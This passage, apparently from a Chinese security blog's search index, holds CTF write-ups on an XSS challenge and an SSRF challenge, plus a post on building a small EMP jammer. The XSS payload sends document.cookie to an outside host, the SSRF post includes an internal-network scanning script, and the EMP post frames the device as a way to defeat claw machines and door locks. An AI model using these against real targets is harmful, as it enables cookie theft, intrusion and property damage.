&lt;li&gt;&lt;a href=&quot;/flag&quot;&gt;Flag&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Help&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt;&lt;/div&gt;&lt;div id=&quot;main&quot;&gt; &lt;h1 id=&quot;title&quot;&gt;Post to Zuckonit&lt;/h1&gt; &lt;div id=&quot;main-content&quot;&gt; &lt;div id=&quot;filter&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;Write Down What On your Mind&lt;/legend&gt; &lt;div id=&quot;textarea&quot;&gt; &lt;label&gt; &lt;textarea id=&quot;content&quot; cols=&quot;30&quot; rows=&quot;1&quot;&gt;&lt;/textarea&gt; &lt;/label&gt; &lt;/div&gt; &lt;p class=&quot;lead&quot;&gt;Attention: you can freely &lt;strong&gt;post&lt;/strong&gt; your thoughts to this page. But this online editor is vulnerable to attack, so you can write down &lt;strong&gt;XSS&lt;/strong&gt; sentences and &lt;strong&gt;submit&lt;/strong&gt; them to bot backend, and CAPTCHA is necessary. &lt;/p&gt; &lt;div id=&quot;controls&quot;&gt; &lt;div class=&quot;buttons&quot;&gt; &lt;label for=&quot;content&quot;&gt;&lt;/label&gt;&lt;input type=&quot;text&quot; placeholder=&quot;what do you want to search?&quot; id=&quot;substr&quot; autocomplete=&quot;off&quot;&gt; &lt;button id=&quot;search&quot; class=&quot;button&quot;&gt;Search!&lt;/button&gt; &lt;/div&gt; &lt;div class=&quot;buttons&quot;&gt; &lt;button id=&quot;send&quot; class=&quot;button&quot;&gt;Post it !&lt;/button&gt; &lt;label for=&quot;captcha&quot;&gt;&lt;/label&gt;&lt;input type=&quot;text&quot; placeholder=&quot;&quot; id=&quot;captcha&quot; autocomplete=&quot;off&quot;&gt; &lt;button id=&quot;submit&quot; class=&quot;button&quot;&gt;Submit&lt;/button&gt; &lt;button id=&quot;clear&quot; class=&quot;button&quot;&gt;Clear posts&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/fieldset&gt; &lt;/div&gt; &lt;div id=&quot;output&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 分析使用 XSS 窃取 cookie 的话免不了跨域请求，but在主页面已经禁止了跨域。 但是当时做题没注意到，**/preview页面没有跨域限制** 再仔细看 python 程序有两个过滤函数，分别对 POST 的内容和 search 的内容进行过滤 对于 POST 内容的过滤，提取&lt;iframe src=&quot;xxxxxx&quot;&gt;, 如果没有提取到，则提取 &lt;&gt;中间的内容，如果尖括号也没有，就返回原字符串。 对于 search 内容的过滤，删掉所有 &lt; &gt; &quot; \\, 然后再看 preview.html页面，有一段 js 代码，对文本进行正则替换 这里的逻辑是，直接将过滤后的 search 内容作为正则表达式，并将匹配结果替换成 b标签，中间的文本不是原内容，而是 过滤后的 search 内容。这里其实是可控的，只要我们输入的 search 内容绕过了过滤 题解由于一个页面有跨域限制一个没有，所以第一步应该想到，POST 一个 &lt;iframe src=&quot;preview&quot;&gt; 然后成功在主页嵌入了/preview页面，接下来专心在/preview搞 XSS 就行 发现对于 search 并没有过滤 |, 而这个符号是 或 的意思，在正则匹配里，/a|b/的表达式匹配到 a 或 b 都算匹配成功，利用 JavaScript里的 replace 漏洞，于是我们测试一下： 成功了，JavaScript 在用iframe|XSSXSSXSS匹配到 ”iframe‘“后直接用 &lt;b class=&quot;search_result&quot;&gt;iframe|XSSXSSXSS&lt;/b&gt;替换了 ”iframe“ 接下来只要把 XSSXSSXSS 换成我们需要的东西 但是要注入 XSS 代码的话，必不可少的是尖括号，search 的时候输入尖括号是注定不行了，但是可以利用 iframe 标签两边的尖括号，这时候就利用了 replace函数中和$相关的几个特殊正则表达式： 具体使用方法在 CSDN 找到了一个例子： 所以在这题里，输入$` 会输出 &lt; **, **输入$’ 会输出 src=”preview” &gt; ，测试一下： 成功 接下来直接构造 XSS 内容就好了 1iframe|$`input onfocus=window.open('https://xss.mjclouds.com/index.php?cookie='+document.cookie) autofocus$' 测试一下： 成功，然后浏览器会直接弹出窗口 XSS 平台也接收到了消息 然后手残刷新了一下主页….然后因为是 autofoucs 的缘故，会直接弹出新页面，导致主页根本看不了，所以**千万不能刷新主页 最后破解 md5 ，python 暴力破解： 123456789101112131415161718import hashlibimport stringlist = string.ascii_letters + string.digitsfor a in list: for b in list: for c in list: for d in list: for e in list: for f in list: str4 = (a + b + c + d + e + f).encode(&quot;UTF-8&quot;) value = hashlib.md5(str4) value1 = value.hexdigest() # print(value1) s4 = value1[:6] # print(s4) if s4 == 'de6404': print(str4) 一段时间就破解完成，提交！ 参考文章:参考链接","link":"/2021/03/19/%E4%B8%80%E9%81%93%E5%A5%87%E6%80%AA%E7%9A%84-XSS/"},{"title":"EMP 研究","text":"摘要本文主要介绍研究 EMP 的过程和成果 EMP 从入门到入狱在法律的边缘疯狂试探 [TOC] 来源从娃娃机说起假如一个人 “商场里的娃娃机有没有什么作弊技巧”, 一般人会说: 使劲摇晃控制杆 放爪以后要一直摁住按钮 同时从侧面和正面瞄准 抓娃娃的头 你厉害可以把它程序破解了 … 但是这些只能算技巧, 有一种工具，使用纯物理方法可以直接破解娃娃机，实现不付钱，娃娃机随便玩, 这种工具甚至还能破解少部分电子门禁和自动贩卖机. 还有个神奇的用处是, 隔空点灯 起初也不知道这个东西是什么，最后得益于 Google 得到了 EMP jammer 这个关键词。 电磁武器 如果人在电磁脉冲发生时接近受影响的电子设备，则可能因为瞬间产生的超高电压而灼伤、休克，甚至死亡。 电磁脉冲炸弹被认为是21世纪规模最大的破坏性武器，可以对电子信息系统、指挥控制系统和网络信息系统产生巨大威胁，号称信息时代的“第二原子弹”。 世界各军事强国的电磁脉冲打击武器正在走向实用化。美国海军作战部部长拉夫·黑德上将曾说，这种电磁脉冲炸弹是“革命性的作战武器”，“决不能让美军错过了这种武器”。 据美国媒体5月报道，多年来，作为“反电子设备高功率微波先进导弹工程”(Champ)的一部分，科学家一直想创造出这样的武器。而美国空军近日宣布，他们已经掌握了该项先进技术，并可以配合隐形联合空地防区外导弹(JASSM)一起展开部署。而Champ将成为一种改变战争面貌的远射武器。由于轰炸机和战斗机都可以发射JASSM导弹，JASSM导弹将成为部署Champ的理想平台。 早在2012年，波音公司就曾在一次长约一小时的飞行中对该武器进行试验，成功使整个军营的计算机陷入瘫痪状态。在波音公司进行的试验中，导弹低低地飞过犹他测试与训练场上方，向七个目标发射了电磁脉冲，结果永久摧毁了它们的电子系统。波音公司表示，这次测试已经成功到“没有办法用摄像机进行记录”。 日本防务专家凯尔·沟日前在美国《国家利益》网站上发表了《5种永远不该使用的武器》的文章，电磁脉冲武器赫然位列其中。他说，大多数战争武器，从手枪到战斗机，通常都被认为是合法的，而且(考虑到使用它们的目的是枪杀)还算是相当仁慈的战争工具。然而有一些武器(无差别和不人道的杀人武器)有可能打击到非战斗人员，甚至影响全球范围的人类文明。还有一些武器，会给人造成难以忍受的伤害，导致长时间痛苦并死亡。 虽然电磁脉冲对生物体几乎不会造成直接影响，但如果在电磁脉冲发生时接近受影响的电子设备，则可能因为瞬间产生的超高电压而灼伤、休克，甚至死亡，同时也可能因为电子设备受到电磁脉冲影响而短路，造成爆炸或火灾等伤害。 背景调研电磁脉冲被发现1963年，美国在太平洋海岛约翰斯顿岛上空400公里处进行核爆试验，距离其数千公里外的檀香山、夏威夷群岛却深受影响，警报器、电子通信监视指挥系统相继失灵。 电磁脉冲炸弹的产生源自美苏两国进行的氢弹引爆试验。1963年7月9日，美国在太平洋海岛约翰斯顿岛上空400公里处进行空中核爆试验，距离其数千公里外的檀香山的数百个警报器全部失灵，瓦胡岛的照明变压器全部被烧坏，檀香山与威克岛的远距离短波通信也突然中断。 此外，距离爆炸中心投影点1300公里的夏威夷群岛上，美军的电子通信监视指挥系统也相继失灵，整个岛上防盗警报器响个不停，街灯熄灭，电器被烧毁。甚至连距离爆炸中心5000公里的澳大利亚都受到了影响。无独有偶，苏联进行的相关氢弹爆炸试验也导致数千公里内的电子设备被烧毁，甚至苏军的雷达也被烧坏，通信线路全部中断。 经过数年的研究，人们终于发现，原来氢弹类的原子弹爆炸不仅会产生冲击波、光辐射、核辐射和放射性污染，还会产生电磁脉冲效应。氢弹爆炸产生的密集的α射线和γ射线会从大气中电离出大量高速运动的电子，继而在空中产生强大的电场。在爆炸中心附近几公里内的电场强度可以达到数万伏/米，不断变化的电场又会激励出磁场，瞬间产生的电磁场会以光速传播并产生强大的电磁脉冲，从而导致地面上的电器产生感应电磁场，继而将电子设备烧毁。 国家研制防脉冲武器危害EMP 会干扰电器的运作，有时会造成损坏，有时干扰将造成不可逆的严重后果。 对电路的干扰 瞬间高压电磁波，在扫过线路的时候会在线路里复现高电压电信号，以此冲击电容烧坏电路或逼迫对方重启丢失信息 复现出一个信号，被设备错误读取 系统瘫痪 成功阻断了通信并摧毁来袭的导弹 让所有的雷达、通信设施、指挥设施全部瘫痪，从而使舰载武器变成废铁 安全问题 比方说电子门锁，出于安全规定，设备在断电或故障状态下，门锁必须为打开状态。简单的电子锁可以分为验证模块和锁模块，当验证通过时，会向锁发送开锁信号。使用 EMP 能直接在信号线中复现出一个开锁信号，或者还可以直接攻击电路让它发生故障，这样两种方式都能导致门锁自动打开，有极大的安全隐患。 研究思路 发生原理 被干扰原理 简易仿制 了解干扰的影响因素 如何防御 研究过程工作原理的探索EMP 波形图 假设左图是一个正常工作的电线，通有 5V 的电平信号，当在极短时间出现了一个极高电压的电信号，如中间的图所示，这个信号即称之为 EMP ( electromagnetic pulse)。当然通常情况下其波形不会那么好看，一般情况下，其波形会像图三那样。 电路分析搜索电路图经过全网搜索，包括但不限于新闻、论文和视频，搜集到了一些简易 EMP 设备的电路图，经过整理大致如下： 分析电路一个简易的 EMP干扰设备主要由一个逆变器、一个线圈、若干电容和导线组成。当高压通电时，会为电容充电，当电充满之后，会流经线圈在火花激发处击穿空气，于是瞬间放电后电压骤降产生了一个电磁脉冲，而线圈的作用说简单一点就是一个天线，将这个脉冲波辐射出去。最简单的 EMP 可以不用电容，加上电容可以准确地操控电磁脉冲频率，其实这也是一种在谐振频率上驱动特斯拉线圈的方法。电路本生不复杂，但是高电压击穿空气产生的脉冲本身无法对任何设造成明显干扰，所以问题在于如何生成一个干扰能力更强的电磁脉冲，并使之能向周围扩散。 对简易 EMP 的个人理解就是，它由两部分组成，分别是生成脉冲的模块和将脉冲辐射出去的模块。脉冲生成的方法就有很多，我们可以直接选择断开一个回路导线，使之产生一个合理的间隙，并假如一个电容，当空气被击穿时，脉冲便生成了，这也是最简易的 EMP 制造的方法。这里我们必须将回路切断并留有一定间隙来让电流击穿空气。原因是假如没有间隙，回路是闭合的话，当电压冲到某一高值，根本就不会有尖峰，还发生短路，但是如果留有间隙，电容则会在某个电压处瞬间放电，循环往复就能产生脉冲信号。另外是将回路中的脉冲辐射成电磁波的模块，简而言之就是根天线，回路中的任何一段导线其实都可以充当天线的作用，因为通电导线周围能产生磁场，但是为了更好的效果，我们会选择缠绕起来的导线，即螺线管来充当导线。 我们一般直接将螺线管串联在电路里，但为了达到更好的效果，我们会选择将螺线管缠绕在另外一根绝缘导线上，来达到定向发射的目的。 产生电磁脉冲的方式，对于简易的 EMP，当电压达到一定高度时，火花隙间空气被击穿，线圈瞬间通电并断电，这一过程中一个瞬间的电流（浪涌）会流过线圈，便在线圈线圈上激发处了电磁脉冲。当两根线靠得很近的时候，两者之间会生成电容，所以他们之间也会发生传递交流电压的耦合，这样磁场和电场的干扰就会同时发生。信号频率越高，电磁干扰就越严重。由于电容的阻抗和频率成反比，高频的时候电流就越大，这样磁通量的变化率也就越快，导致更大的电动势，从而导致更强的干扰效应。当频率高到一定程度，电磁场就会像光一样，以电磁波的形式向周围扩散。 上图中含有柱状炸药的则是 EMP 武器，其原理稍有不同。首先和之前的 EMP 一样，用电池给电容充电，当电容电压足够高时，向导线圈放电。等导线圈内电流达到最大时，即刻将左侧柱状炸药引爆，激波波面以超过介质声速向右传播，波后反应区里的炸药在高温高压下被连续引爆。由于螺旋形的导线形成内部直线型的磁场，随着炸药从左向右引爆，炸药住的铁皮外壳连续破裂与线圈短路，同时高速向右移动，让线圈内的磁通量不断向右压缩，同时线圈的匝数不断减少，导致线圈里的感生电流越来越高。这些感生电流都输入到虚阴极管，通过谐振生成高频电波，最后由微波天线来释放这些电波，形成破坏力强大的电磁脉冲。 被干扰原因如果一个电路正好处在 EMP 产生的电磁波范围内，并且它足够脆弱，那么它就会被干扰。电生磁，磁生电，EMP 激发出的电磁波使得被干扰系统的电路中的小回路上产生了感应电流。电磁干扰可以在电路上产生各种奇怪的电流电压。比方说我们需要一个正脉冲，但是感应电流在这生成了一个负脉冲，这样一来设备就会接收到错误的信息，整个系统就会出现瘫痪等问题。 如图所示，左图为一个正常的方波，当带电磁脉冲干扰启动，波形立刻被干扰了。 不过干扰电磁波的波长必须和系统中的电线长度匹配。如果电路比它的波长小很多，那么电路只会占到干扰信号相对平缓的部分，这样反而就没有干扰了。如果电路很长，或者干扰信号频率很高的话，干扰波的高电平和低电平会全部耦合进电路，这样整个系统就会产生很强的噪声了。所以说电路越小干扰就越困难，频率越高，就越容易干扰电路。 制作一个这里我们来制作一个简易的 EMP 装置感受一下。目标是能成功弄坏室友的闹钟。 材料选择我们需要一个能产生电磁脉冲的装置，为了方便，直接使用 1000KV 高压包，免去自己配升压电路的麻烦和危险。然后选择线圈的时候要考虑到在瞬间高电压的时候要确保其不会被击穿，所以我选择了 0.75 mm 的漆包线。为了保证安全，还加装了开关。但是暂时没有配备电容，一方面因为不清楚具体应该使用什么型号的电容，一方面是实验本身对电磁脉冲的频率没什么要求，能用就行。但是值得注意的是，如果要添加电容的话，一定要使用类似于闪光电容器，而不能使用类似于法拉电容，因为前者能在瞬间释放掉所有能量而后者相当于是个电路中的稳定器，而这里我们恰恰需要能在短时间内释放所有能量的电容。 组装过程 集成了电源开关、启动按钮、EMP 线圈和电池充电器。 测试经过测试，这个小型 EMP 已经成功摧毁了我一块手表和一个闹钟…但是它的能量不足以点亮日光灯。 对干扰效果的影响因素研究要想让 EMP 达到最佳的效果，影响因素是十分多的，不仅取决于攻击方，也取决于被攻击方。 电压 较低的感应电动势不足以对电路造成干扰，所以要想得到较好的效果，必须要生成较高的感应电动势，也就是说，EMP 生成的脉冲电压一定要足够高，时间也要尽可能短。所以一方面，我们可以使用较强劲的逆变器，将低压电转换为超高压电，一方面我们可以换上更高级的电容器，使其拥有更强的性能在更短时间放出更多能量。 线圈密度线圈的参数关系到 EMP 所激发的磁场。线圈匝数越多，激发出来的磁场也越强，但这同时也增加了电感，这么一来阻抗也增大了，线路中的高速电流交换就会受到影响，导致干扰效果变弱，因此必须要做好阻抗匹配才能使装置达到一个极好的效果。当线圈的匝数和直径根据电源输出电压的频率调整到一个合适的状态的时候，其干扰效果是最佳的。 被干扰导线长度干扰电磁波的波长必须和系统中的电线长度匹配。如果电路比它的波长小很多，那么电路只会占到干扰信号相对平缓的部分，这样反而就没有干扰了。如果电路很长，或者干扰信号频率很高的话，干扰波的高电平和低电平会全部耦合进电路，这样整个系统就会产生很强的噪声了。所以说电路越小干扰就越困难，频率越高，就越容易干扰电路。 持续干扰和脉冲干扰 大多数时候，电器虽然受到干扰就会出错，但只要干扰一停下，电器就恢复正常运作。但比起持续的干扰波，用一个脉冲有两点好处。首先，制造高功率的电磁波本身就要消耗巨大的能量，军队可以吃得消，但大多数时候我们手头的能量是有限的，所以与其向电路系统发射小功率的持续干扰，不如花点时间收集能量然后集中在一点上爆发出去，这样的爆发可以循环下去。每次脉冲都是一次强力的蓄力爆发式攻击。第二点，由于每个电路的敏感频率不一样，所以使用稳定在一个频率上的持续干扰波是不能干扰到所有电路的，但是理想状态的尖信号就可以理论上涵盖所有频率，并且理论上波尖约尖效果越好，这也是为什么需要一个能瞬间释放能量的电容的原因。 如何防止被干扰任何电路都会以辐射或者导线传导的方式释放噪声，同时也会受到来自辐射和导体的干扰噪声。那么防止被 EMP 干扰便有通过释放噪声和防止吸收噪声两个方法。 避免释放噪声 首先一定要让电路中构成回路的两根导线尽可能地接近，这样电流流进的那根线生成的磁场就可以和电流流出那根线生成的磁场相互抵消，这样就可以减少辐射，免于干扰其他电路。 其次不要使用多余的线，多余的线既会辐射也会吸收更多的噪声，理想的接线是两点之间拉直线。 再者，脉冲信号要使用缓和的波，不然就容易释放高频的谐波，同样会对其他电路造成干扰。 还有，高频信号线的接线或者印刷线路尽量避免尖锐的拐角，佛则尖锐的拐角也极易辐射噪声。 最后，一定要为电路设计一套完善的滤波体系，既可以抗干扰，也可以减少自身的释放。 减少吸收噪声电线要尽可能短，如之前所述，电线越短，那么电线只会占到干扰波波长的一小部分，这样的噪音可以很方便被过滤，有效避免干扰。 同时，弱信号线一定要和带噪声的信号线分开来放，中间用一个接地的板子隔开来，这样就可以吸收掉噪声。 然后，重要的信号强度一定要大，让信号源的输出头阻抗尽量的小，同时也要避免用尖锐的方波。同时与之对应，弱信号线可以用滤波电容过滤掉高频噪声。 还有一个方法，就是将所有东西都要用接地的屏障罩起来，比方说给电气设备来个法拉第笼。 研究结论电磁脉冲是一种突发的、宽带电磁辐射的高强度脉冲。所在电磁频段取决于EMP源。高能电磁脉冲在我们生活中无处不在，任何一根导线，一个家用电器，都会产生这种脉冲，只是它的能量弱得不足以被我们感知。我们一般所说的 EMP 其实是具有攻击性的高能电磁脉冲，它具有极大的破坏性。一般而言电磁脉冲对生物体没有任何影响，但在电磁脉冲发生时靠近电力及电器设备等足以大量聚集电磁脉冲波物品的生物体可能因瞬间的超高电压而灼伤、休克甚至死亡。 其工作原理很简单，即电路中电流的瞬间变化产生了电磁场，这个电磁场使周围的的电路产生感应电流，干扰系统正常运行。为了放大这个电磁场，可以在电路中加入天线等装置。当然为了使干扰更具有针对性，电路中加入电控、mos 管来控制脉冲频率即波形。 对 EMP 的防御不仅仅在于军事领域的防御，在普通电路板的设计中也要注重对电磁脉冲干扰的防御，以使设备你能够在复杂磁环境中稳定运行。多种措施可以防御 EMP 攻击，从最基本的只用滤波器、电子管到使用电磁屏蔽罩，都可以有效避免电路受到干扰。 参考文章:参考链接","link":"/2021/04/06/EMP-%E7%A0%94%E7%A9%B6/"},{"title":"HCTF INTERNAL SYSTEM 复现","text":"摘要 2021 HCTF WEB HCTF INTERNAL SYSTEM 复现（失而复得的 MD） 题目已上线 [BUUCTF](https://buuoj.cn/challenges#[虎符CTF 2021]Internal System) 打开环境，直接是一个登陆页面： 随便测试一下，这里看到，如果密码错误，还会返回登陆页面，并且登陆信息是通过 GET 请求上传的： 测试无果，查看源代码，发现注释： 进入/source, 发现 nodejs 代码； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151const express = require('express')const router = express.Router()const axios = require('axios')const isIp = require('is-ip')const IP = require('ip')const UrlParse = require('url-parse')const {sha256, hint} = require('./utils')const salt = 'nooooooooodejssssssssss8_issssss_beeeeest'const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin'))const port = process.env.PORT || 3000function formatResopnse(response) { if(typeof(response) !== typeof('')) { return JSON.stringify(response) } else { return response }}function SSRF_WAF(url) { const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, '') return isIp(host) &amp;&amp; IP.isPublic(host)}function FLAG_WAF(url) { const pathname = new UrlParse(url).pathname return !pathname.startsWith('/flag')}function OTHER_WAF(url) { return true;}const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]router.get('/', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.redirect('/index') }})router.get('/login', (req, res, next) =&gt; { const {username, password} = req.query; if(!username || !password || username === password || username.length === password.length || username === 'admin') { res.render('login') } else { const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect('/index') }})router.get('/index', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.render('index', {admin: req.session.admin, network: JSON.stringify(require('os').networkInterfaces())}) }})router.get('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) { res.render('base', {title: 'WAF', content: &quot;Here is the waf...&quot;}) } else { try { const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', response.data) } catch(error) { res.render('base', error.message) } }})router.post('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } // test url // not implemented here const url = &quot;https://postman-echo.com/post&quot; await axios.post(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', &quot;Something needs to be implemented&quot;)})router.all('/search', async (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'}) } const result = {title: 'Search Success', content: ''} const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try { if(method == 'get') { const response = await axios.get(url) result.content = formatResopnse(response.data) } else if(method == 'post') { const response = await axios.post(url, data) result.content = formatResopnse(response.data) } else { result.title = 'Error' result.content = 'Unsupported Method' } } catch(error) { result.title = 'Error' result.content = error.message } return res.json(result)})router.get('/source', (req, res, next)=&gt;{ res.sendFile( __dirname + &quot;/&quot; + &quot;index.js&quot;);})router.get('/flag', (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'No Flag For You!'}) } return res.json({hint: hint})})module.exports = router 目前对 nodejs 知之甚少，于是先慢慢看这段代码。 url.parse()函数返回一个 url 对象： 好了，重新回到题目，从/login下手 要想进入/index页面，账号密码符合的条件是：账号密码都存在，账号密码不相同且长度也不相同，并且账户名不能是 字符串admin. 感谢诸位大佬, 一个新知识点出现了。在 js 中： 1'admin' + ['admin'] == 'adminadmin' 所以观察 adminHash 的构造，可以很容易的绕过登录判断： 12username = ['admin']salt + username == salt + 'admin' 于是就可以构造 payload： 1http://94bc9026-2036-4ad9-b9ba-bea8f7bcc17a.node3.buuoj.cn/login?username[]=admin&amp;password=admin 成功登录!!! 观察一下 /index 是什么鬼东西。这里的 URL 搜索框提交的数据直接去 /proxy 来进行处理，有 post 和 get 两种方法。 观察一下 post 方法的处理过程，不难发现无论提交了什么样的 url 最后的代理请求 url 都会变成 http://127.0.0.1:3000/search?url=https://postman-echo.com/post，所以这里其实是没有操作空间的，因此只能寄希望于 get 请求。 当向 /proxy 发送了 get 请求后，后台首先判断你是不是 admin，只能 admin 才能提交请求。然后后端会解析提交的 url 值，对这个 url 进行三次 waf 检测，只有全部通过才能继续接下来的操作。 对于 SSRF_WAF 函数，首先将要搜索的 url 中的 hostname 提取出来，然后删掉所有的方括号（我猜是为了防止使用 MAC 地址？）。举个例子，如果说 url=http://127.0.0.2:9080/api/xxx，那么最后的结果就是 host = 127.0.0.2 。然后如果 host 是 IP 地址 并且不是内网地址，才能返回 true 对于 FLAG_WAF 函数，会检测 url 的 pathname，对于上一段的例子 pathname 就是 /api/xxx，如果 pathname 不是以 /flag 开头就返回 true 最后一个 OTHER_WAF 函数，存在意义不大哈哈哈 就这三个 waf 如果全部通过，才能执行后续代码。 如果检测全部通过，我们提交的 url 会转发到 /search 页面，也就是http://127.0.0.1:3000/search?url=${url}，那么接下来再看看 /search 的代码。 ummmmm，首先检测发起请求的 IP，必须得从内网 127.0.0.1 来发起请求才能继续执行代码，所以我们直接访问这个页面是无效的： 接下来，常规解析url 参数。然后对请求方式进行判断，如果对/search 发起的是 post 请求，那么后台就会同样用 post 的方式去请求我们要的 url，同样的如果是 get 请求，那么后台就会同样用 get 的方式去请求我们要的 url 。回到 /index 页面的代码，发现我们对 /proxy 发起了 post 请求，那么/search 发起的也是 post 请求，对 /proxy 发起了 get 请求，那么/search 发起的就是 get 请求。BUT 显然 post 对我们毫无用处，因此 和 post 请求有关的代码都不用看。 随后后台会直接访问由 /proxy 转发来的 url 地址，并把得到的响应展示出来。 比方说我来搜索我自己服务器IP地址： 得到了正确的响应，和直接浏览器里访问一模一样： 当然如果搜索像 http://127.0.0.1/ , http://127.0.0.1/flag 这样的地址是肯定要被 waf 的。 but 目标很明确我们得去/flag页面，因为那有 hint： 同样的，这里也必须是内网来访问。 思考一下，前面的 waf 好像有漏洞，如果参数 url 来个套娃，其实waf是检测不到套娃里有没有内网地址或者flag的。 但是又出现了新问题：如果要实现套娃来获得 /flag 的内容，必要条件是对 /proxy 发起的搜索 url 必须是以 内网地址开头，但显然内网 ip 会被 waf。 在实际应用中，一般我们在服务端绑定端口的时候可以选择绑定到 0.0.0.0，这样我的服务访问方就可以通过我的多个ip地址访问我的服务 而 isPublic(“0.0.0.0”) //true 所以直接可以搜索 http://0.0.0.0:3000 ，这样子就成功绕过了 内网waf 检测： 于是我们就可以去访问有内网限制的地址了，直接构造 http://0.0.0.0:3000/search?url=http://127.0.0.1:3000/flag 成功获得了 /flag 中的 hint，然而并没有 flag… hint 是 内网里还有个 Netflix 服务器。 那么下一步我们要找到服务器在内网的地址。想起来刚刚登陆成功的时候，显示了几行字没有用上： 忙猜应该是在 10.0.130.8 ~ 10.0.130.24 或者是 10.128.0.99 ~ 10.128.0.99，这得扫描一波。但是并不知道具体端口号，就很烦。 去网上看了些 Netflix 的安装教程，发现 Netflix 默认安装在 8080 端口，那么就写个脚本试试吧： 1234567891011121314151617181920212223import requestslogin = &quot;http://3c04bee4-a46a-495f-ab54-0b66e43c16d1.node3.buuoj.cn/login?username[]=admin&amp;password=admin&quot;url = &quot;http://3c04bee4-a46a-495f-ab54-0b66e43c16d1.node3.buuoj.cn/proxy?url=&quot;targe1 = &quot;http://0.0.0.0:3000/search?url=http://10.0.130.&quot;targe2 = &quot;http://0.0.0.0:3000/search?url=http://10.128.0.&quot;session = requests.session()res = session.get(url=login)# print(res.text)for i in range(9, 25): t = url + targe1 + str(i) + &quot;:8080&quot; r = session.get(url=t) if &quot;Error&quot; not in r.text: print(url + targe1 + str(i))for i in range(16, 100): t = url + targe2 + str(i) + &quot;:8080&quot; r = session.get(url=t) if &quot;Error&quot; not in r.text: print(url + targe2 + str(i)) 找到了找到了，Netflix 服务器再 10.0.130.14 这就是 Netflix 的文档页。 下一步应该是查看版本，经过了解，版本号应该是藏在/api/admin/config 那就去看看： 版本2.26.0 去看了下网上的 参考文章:参考链接","link":"/2021/04/08/HCTF-INTERNAL-SYSTEM-%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"C","slug":"C","link":"/tags/C/"},{"name":"字符串函数","slug":"字符串函数","link":"/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0/"},{"name":"Markdown","slug":"Markdown","link":"/tags/Markdown/"},{"name":"Typora","slug":"Typora","link":"/tags/Typora/"},{"name":"PDF","slug":"PDF","link":"/tags/PDF/"},{"name":"软件","slug":"软件","link":"/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"音乐解密","slug":"音乐解密","link":"/tags/%E9%9F%B3%E4%B9%90%E8%A7%A3%E5%AF%86/"},{"name":"iframe框架","slug":"iframe框架","link":"/tags/iframe%E6%A1%86%E6%9E%B6/"},{"name":"抽奖","slug":"抽奖","link":"/tags/%E6%8A%BD%E5%A5%96/"},{"name":"小游戏","slug":"小游戏","link":"/tags/%E5%B0%8F%E6%B8%B8%E6%88%8F/"},{"name":"笔记本","slug":"笔记本","link":"/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"},{"name":"Microsoft","slug":"Microsoft","link":"/tags/Microsoft/"},{"name":"Arduino","slug":"Arduino","link":"/tags/Arduino/"},{"name":"arduino","slug":"arduino","link":"/tags/arduino/"},{"name":"Hgame","slug":"Hgame","link":"/tags/Hgame/"},{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"单片机","slug":"单片机","link":"/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"程序说明","slug":"程序说明","link":"/tags/%E7%A8%8B%E5%BA%8F%E8%AF%B4%E6%98%8E/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"ctfshow","slug":"ctfshow","link":"/tags/ctfshow/"},{"name":"sql","slug":"sql","link":"/tags/sql/"},{"name":"DIY","slug":"DIY","link":"/tags/DIY/"},{"name":"EMP","slug":"EMP","link":"/tags/EMP/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"复现","slug":"复现","link":"/tags/%E5%A4%8D%E7%8E%B0/"}],"categories":[{"name":"学习笔记","slug":"学习笔记","link":"/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"标记语言","slug":"标记语言","link":"/categories/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"},{"name":"软件分享","slug":"软件分享","link":"/categories/%E8%BD%AF%E4%BB%B6%E5%88%86%E4%BA%AB/"},{"name":"在线小工具","slug":"在线小工具","link":"/categories/%E5%9C%A8%E7%BA%BF%E5%B0%8F%E5%B7%A5%E5%85%B7/"},{"name":"iframe框架","slug":"iframe框架","link":"/categories/iframe%E6%A1%86%E6%9E%B6/"},{"name":"软件教程","slug":"软件分享/软件教程","link":"/categories/%E8%BD%AF%E4%BB%B6%E5%88%86%E4%BA%AB/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/"},{"name":"音乐","slug":"在线小工具/音乐